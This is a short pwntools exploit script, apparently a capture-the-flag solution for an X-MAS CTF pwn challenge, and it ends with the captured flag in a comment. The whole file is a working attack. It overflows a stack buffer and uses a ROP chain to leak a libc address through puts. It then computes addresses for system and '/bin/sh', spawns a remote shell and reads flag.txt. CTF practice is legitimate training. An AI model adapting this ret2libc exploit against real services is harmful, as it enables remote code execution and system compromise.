from pwn import * 

pop_rdi = 0x0000000000401273
pop_rsi = 0x0000000000401271
main = 0x401167
puts_plt = 0x401030
setvbuff_got = 0x0000000000404030

payload = ""
payload += "A"*18
payload += p64(pop_rdi)
payload += p64(setvbuff_got)
payload += p64(puts_plt)
payload += p64(main)

p = remote("challs.xmas.htsp.ro",12006)
#p = process("./chall")
p.recvuntil("nowmen?\n")
p.sendline(payload)
p.recvuntil("Boring...\n")
leak = p.recvline().strip()
leak = u64(leak.ljust(8,"\x00"))

base = leak - 0x0812f0
system = base + 0x04f440
binsh = base + 0x1b3e9a

payload = ""
payload += "A"*18
payload += p64(pop_rsi)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
p.sendline(payload)
p.sendline("cat flag.txt")
p.interactive()

#flag : X-MAS{700_much_5n0000w}